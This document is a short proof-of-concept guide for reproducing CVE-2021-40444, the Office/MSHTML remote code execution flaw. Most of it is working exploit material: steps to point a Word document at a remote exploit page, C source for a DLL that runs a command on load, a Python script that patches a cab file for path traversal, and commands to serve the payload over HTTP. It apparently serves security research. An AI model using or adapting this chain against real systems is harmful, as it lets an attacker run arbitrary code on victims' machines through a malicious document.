# CVE-2021-40444

Reproduce steps for CVE-2021-40444

## Generating docx

Go to `maldoc/word/_rels/document.xml.rels` and edit the two ocurrences for `http://<HOST>` with the URL to the exploit.html Eg.: `http://127.0.0.1/exploit.html` file.

Generate docx:

`cd maldoc/ ; zip -r maldoc.docx *`

## Generating malicious cab

```
#include <windows.h>

void exec(void) {
	system("C:\\Windows\\System32\\calc.exe");
	return;
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason, 
    LPVOID lpReserved )
{
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
           exec(); 
           break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

Exec:

`i686-w64-mingw32-gcc -shared calc.c -o calc.dll`

Generate cab (install lcab `sudo apt-get install lcab`)

`cp calc.dll championship.inf ; mkdir gen/ ; cd gen/ ; lcab '../championship.inf' out.cab`

Copy out.cab into `www/` directory, modify exploit.html to point to `http://127.0.0.1/out.cab`
  
Execute Python script:
  
```py
m_off = 0x2d
f = open('www/out.cab','rb')
cab_data = f.read()
f.close()

out_cab_data = cab_data[:m_off]
out_cab_data += b'\x00\x5c\x41\x00'
out_cab_data += cab_data[m_off+4:]

out_cab_data = out_cab_data.replace(b'..\\championship.inf', b'../championship.inf')

f = open('www/out.cab','wb')
f.write(out_cab_data)
f.close()
```
  
Finally, setup server:
  
`sudo python3 -m http.server 80`

Execute now maldoc.docx in target VM
